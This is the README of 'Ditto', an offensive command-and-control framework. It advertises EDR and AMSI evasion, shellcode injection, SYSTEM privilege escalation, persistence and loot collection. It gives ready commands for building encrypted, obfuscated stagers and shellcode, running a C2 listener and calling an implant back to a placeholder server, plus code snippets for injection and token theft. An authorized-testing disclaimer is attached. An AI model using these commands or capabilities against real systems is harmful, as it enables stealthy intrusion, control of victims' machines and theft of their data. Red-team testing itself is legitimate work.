# Ditto 🎭

<div align="center">

![Ditto Logo](ditto.png)

**Advanced Security Testing Framework**

*A production-ready red team framework with advanced evasion techniques, C2 capabilities, and comprehensive module support*

[![Go Version](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://github.com/rxid09672/ditto)

</div>

---

**THIS SOFTWARE IS FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.**

---

## 🚀 Features

### Advanced Evasion Techniques
- ✅ **Direct Syscall Unhooking** - Runtime syscall detection, bypasses userland hooks
- ✅ **ETW/AMSI Patching** - Blinds Windows telemetry and script scanning
- ✅ **PE Unhooking** - Complete DLL refresh from disk to remove hooks
- ✅ **Hardware Breakpoint Detection** - Detects debuggers
- ✅ **String Obfuscation** - Runtime encryption/decryption
- ✅ **Sleep Masking** - Evades timing analysis
- ✅ **EDR Unhooking** - Comprehensive unhooking suite
- ✅ **Sandbox Detection** - Detects sandboxed environments
- ✅ **VM Detection** - Identifies virtual machine environments
- ✅ **Call Stack Spoofing** - Advanced anti-forensics techniques

### Process Injection & Execution
- ✅ **Direct Syscall Injection** - Unhooked process injection
- ✅ **Multiple Methods** - CreateRemoteThread, NtCreateThreadEx, QueueUserAPC
- ✅ **Process Migration** - Complete with shellcode extraction
- ✅ **Cross-Platform** - Windows, Linux, macOS support
- ✅ **Process Management** - List, find, and manipulate processes

### Privilege Escalation
- ✅ **GetSystem** - Automated SYSTEM elevation with intelligence gathering
  - AccessChk-based permission discovery before escalation
  - Named pipe enumeration for vulnerable pipes
  - Intelligent merging of AccessChk and PrivescCheck findings
  - Automatic pipe discovery and exploitation
  - NamedPipe and Token manipulation techniques
- ✅ **GetSystemSafe** - Stealthy LOLBin-only privilege escalation
  - Pure Windows native tools (no PowerShell modules)
  - Optional AccessChk discovery with graceful degradation
  - Named pipe intelligence gathering
  - Multiple escalation methods sorted by noise level
  - Registry hijack techniques (Event Viewer, FodHelper, etc.)
  - Service creation using PsExec-inspired mechanism
- ✅ **Token Manipulation** - Impersonation and token theft
- ✅ **MakeToken** - Credential-based token creation
- ✅ **Intelligence Integration** - Pre-escalation vulnerability discovery

### C2 Capabilities
- ✅ **HTTP/HTTPS Transport** - Encrypted communication
- ✅ **mTLS Transport** - Mutual TLS authentication
- ✅ **Session Management** - Beacon and interactive sessions
- ✅ **Multi-Transport** - Support for multiple protocols
- ✅ **Task Queue** - Reliable task distribution and execution
- ✅ **Session Synchronization** - Real-time session updates

### Pivoting & Network Operations
- ✅ **Port Forwarding** - TCP port forwarding through sessions
- ✅ **SOCKS5 Proxy** - Full SOCKS5 proxy support with authentication
- ✅ **Dynamic Pivot Management** - On-demand pivot creation

### Module System
- ✅ **400+ Empire Modules** - Full PowerShell, Python, C#, BOF support
- ✅ **YAML Configuration** - Easy module definition
- ✅ **Custom Handlers** - Complex module generation logic
- ✅ **Dynamic Loading** - Runtime module execution
- ✅ **Module Registry** - Centralized module management

### Interactive CLI
- ✅ **Beautiful Welcome Screen** - ditto.png ASCII art banner
- ✅ **Interactive Commands** - Easy-to-use CLI interface
- ✅ **Payload Generation** - Quick payload creation with extensive options
- ✅ **Server Management** - Built-in C2 server
- ✅ **Job Management** - List, start, and stop background jobs
- ✅ **Listener Management** - HTTP, HTTPS, mTLS listeners
- ✅ **Session Interaction** - Full session control and command execution
- ✅ **Loot Management** - Store and manage collected data
- ✅ **Persistence Management** - Install persistence mechanisms
- ✅ **Implant Management** - Track and manage generated implants

### Payload Generation
- ✅ **Multiple Payload Types** - Stager, shellcode, full implant
- ✅ **Cross-Platform** - Windows, Linux, macOS support
- ✅ **Multiple Architectures** - amd64, 386, arm64
- ✅ **Encryption Options** - AES-256, ChaCha20
- ✅ **Obfuscation** - Code obfuscation and string encryption
- ✅ **Custom Callbacks** - Flexible callback URL configuration
- ✅ **Beacon Timing** - Configurable delay and jitter
- ✅ **Module Embedding** - Embed Empire modules at build time
- ✅ **Evasion Features** - Selective evasion technique enablement

### Filesystem Operations
- ✅ **File Operations** - Upload, download, read, write, delete
- ✅ **Directory Operations** - List, create, navigate directories
- ✅ **Advanced Operations** - File permissions, timestamps, metadata

### Persistence
- ✅ **Windows Persistence** - Registry, Services, Scheduled Tasks, Startup folder
- ✅ **Linux Persistence** - systemd, cron, rc.local
- ✅ **macOS Persistence** - launchd, login items

### Loot Management
- ✅ **Loot Storage** - Centralized storage of collected data
- ✅ **Type Classification** - Organized by data type
- ✅ **Export Functionality** - Export loot as JSON

### Certificate Management
- ✅ **CA Generation** - Self-signed certificate authority
- ✅ **Certificate Generation** - Server and client certificates
- ✅ **Automatic Certificate Management** - Auto-generate when needed

### Database Persistence
- ✅ **SQLite Database** - Persistent storage for sessions, jobs, implants
- ✅ **Job Tracking** - Long-running job persistence
- ✅ **Implant Tracking** - Build history and metadata

### Command Execution
- ✅ **Safe Command Execution** - Input validation and sanitization
- ✅ **File Transfer** - Upload/download with path sanitization
- ✅ **Command Injection Protection** - Pattern detection and blocking

## 🆕 Recent Updates

### Sysinternals Privilege Escalation Enhancements

**New Features:**
- **AccessChk Integration** - Pre-escalation permission discovery using Sysinternals AccessChk
- **Named Pipe Enumeration** - Automated discovery of vulnerable named pipes before escalation
- **Intelligence Merging** - Combines AccessChk findings with PrivescCheck recommendations
- **Enhanced GetSystem** - Automated escalation chain with intelligence gathering
- **Enhanced GetSystemSafe** - LOLBin-only escalation with optional intelligence gathering

**Technical Details:**
- AccessChk discovery phase runs before PrivescCheck
- Named pipe enumeration identifies exploitable pipes
- Discovered pipes automatically used in NamedPipe technique
- Graceful degradation if Sysinternals tools unavailable
- Novel applications based on Sysinternals research

---

### Prerequisites
- Go 1.24 or later
- Git

### Build from Source

```bash
# Clone the repository
git clone https://github.com/rxid09672/ditto.git
cd ditto

# Build binary
make build

# Or use go directly
go build -o bin/ditto .
```

### Cross-Compilation

```bash
# Build for Windows
make build-windows

# Build for Linux
make build-linux

# Build for macOS
make build-darwin

# Build for all platforms
make build-all
```

---

## 🎯 Quick Start

### Interactive Mode (Recommended)

```bash
# Start interactive CLI
./bin/ditto

# You'll see the ditto.png banner and interactive prompt
[ditto] > help
[ditto] > generate stager windows amd64 payload.exe
[ditto] > server 0.0.0.0:8443
[ditto] > exit
```

### Command Line Mode

```bash
# Generate a payload
./bin/ditto --mode generate \
    --payload stager \
    --os windows \
    --arch amd64 \
    --output payload.exe \
    --encrypt \
    --obfuscate

# Start C2 server
./bin/ditto --mode server --listen 0.0.0.0:8443

# Connect as client
./bin/ditto --mode client --callback https://your-server.com:8443
```

### Available Commands

| Command | Description |
|---------|-------------|
| `generate` | Generate payloads (stager, shellcode, or full) |
| `server` | Start C2 server |
| `client` | Connect as client to C2 server |
| `help` | Show help message |
| `version` | Show version information |
| `clear` | Clear screen |

---

## 📖 Usage Examples

### Generate Windows Stager

```bash
./bin/ditto --mode generate \
    --payload stager \
    --os windows \
    --arch amd64 \
    --output windows_stager.exe \
    --encrypt \
    --obfuscate
```

### Generate Linux Shellcode

```bash
./bin/ditto --mode generate \
    --payload shellcode \
    --os linux \
    --arch amd64 \
    --output linux_shellcode.bin
```

### Start Server with Debug

```bash
./bin/ditto --mode server \
    --listen 0.0.0.0:8443 \
    --debug
```

### Interactive Mode Examples

```bash
# Start interactive CLI
./bin/ditto

# Generate payload
[ditto] > generate stager windows amd64 payload.exe

# Start server on custom port
[ditto] > server 0.0.0.0:8080

# Connect to server
[ditto] > client https://server.com:8443

# Show help
[ditto] > help

# Exit
[ditto] > exit
```

---

## 🏗️ Architecture

```
ditto/
├── banner/              # ASCII art banner system
├── core/                # Core functionality (config, logger, session)
├── crypto/              # Encryption (AES-256, ChaCha20)
├── evasion/             # Evasion techniques
│   ├── syscall_detection.go
│   ├── windows.go
│   ├── indirect_syscalls.go
│   └── callstack_spoofing.go
├── injection/           # Process injection
├── privilege/           # Privilege escalation
├── transport/           # C2 transports (HTTP, mTLS)
├── payload/             # Payload generation
├── modules/             # Module system (400+ Empire modules)
├── main.go              # Main entry point
└── interactive.go       # Interactive CLI client
```

---

## 🔧 Advanced Features

### Direct Syscall Unhooking

```go
ds := evasion.NewDirectSyscall(logger)
r1, r2, err := ds.Call("NtAllocateVirtualMemory", args...)
```

### Process Injection with Direct Syscalls

```go
pi, ds, err := evasion.NewProcessInjectionWithEvasion(logger)
err = pi.InjectShellcode(pid, shellcode, "ntcreatethreadex")
```

### EDR Unhooking

```go
successCount := evasion.UnhookEDR()
// Returns number of successful unhook operations (0-5)
```

### Privilege Escalation

```go
pe := privilege.NewPrivilegeEscalation(logger)
err := pe.GetSystem("winlogon.exe")
err := pe.ImpersonateUser("username")
err := pe.MakeToken("user", "domain", "password")
```

#### Advanced Escalation Features

**GetSystem with Intelligence Gathering:**
- Pre-escalation AccessChk discovery (finds weak permissions)
- Named pipe enumeration (discovers vulnerable pipes)
- Automatic intelligence merging with PrivescCheck
- Uses discovered pipes in NamedPipe technique
- Graceful degradation if tools unavailable

**GetSystemSafe (LOLBin-only):**
- Pure native Windows tools (no PowerShell)
- Optional AccessChk discovery for intelligence
- Multiple escalation methods (sorted by stealth)
- Registry hijack techniques
- Service creation with PsExec-inspired mechanism

---

## 📚 Documentation

- [CLI Usage Guide](CLI_USAGE.md) - Complete CLI reference
- [Production Ready Status](PRODUCTION_READY_COMPLETE.md) - Feature implementation status
- [Evasion & Sliver Implementation](EVASION_AND_SLIVER_IMPLEMENTATION_COMPLETE.md) - Technical details

---

## 🛠️ Development

### Project Structure

```
ditto/
├── banner/          # Banner system
├── core/            # Core components
├── crypto/          # Cryptography
├── evasion/         # Evasion techniques
├── injection/       # Process injection
├── modules/         # Module system
├── payload/         # Payload generation
├── privilege/       # Privilege escalation
├── transport/       # C2 transports
└── Makefile         # Build system
```

### Building

```bash
# Development build
make build

# Production build with version info
go build -ldflags "-X main.buildTime=$(date -u +%Y-%m-%dT%H:%M:%SZ) -X main.gitCommit=$(git rev-parse --short HEAD)" -o bin/ditto .
```

### Testing

```bash
make test
```

---

## 📋 Requirements

- **Go**: 1.24 or later
- **Platform**: Windows, Linux, or macOS
- **Permissions**: Administrator/root for some features

---

## 🔒 Security

- All payloads are encrypted by default
- Code obfuscation available
- Secure communication via TLS/mTLS
- Authorization checks built-in

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

---

## 🙏 Acknowledgments

- Inspired by [Sliver](https://github.com/BishopFox/sliver) C2 framework
- Module system based on [Empire](https://github.com/BC-SECURITY/Empire)
- Evasion techniques from various security research

---

## 📞 Support

For issues, questions, or contributions, please open an issue on [GitHub](https://github.com/rxid09672/ditto/issues).

---

<div align="center">

**Made with ❤️ for authorized security testing**

⚠️ **USE RESPONSIBLY** ⚠️

</div>
